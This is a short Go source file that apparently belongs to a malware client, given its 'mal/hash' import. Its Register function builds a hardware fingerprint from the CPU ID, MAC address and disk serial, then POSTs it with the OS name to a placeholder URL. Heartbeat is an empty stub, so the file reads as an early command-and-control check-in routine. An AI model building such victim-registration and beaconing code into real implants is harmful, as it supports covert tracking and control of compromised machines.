package communications

import (
	"bytes"
	"encoding/json"
	"fmt"
	"mal/hash"
	"net/http"
	"runtime"
)

func Register() {

	cpuID := hash.GetCPUID()
	mac := hash.GetMACAddress()
	diskSerial := hash.GetDiskSerial()

	hardwareHash := hash.GenerateHardwareHash(cpuID, mac, diskSerial)

	data := map[string]string{
		"hardwarehash": hardwareHash,
		// "uptime": uptime,
		"OS": runtime.GOOS,
	}

	// Convert data to JSON
	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	// Make a POST request
	url := "url"
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	// Print response status for testing
	fmt.Println("Response Status:", resp.Status)
}

func Heartbeat() {

}
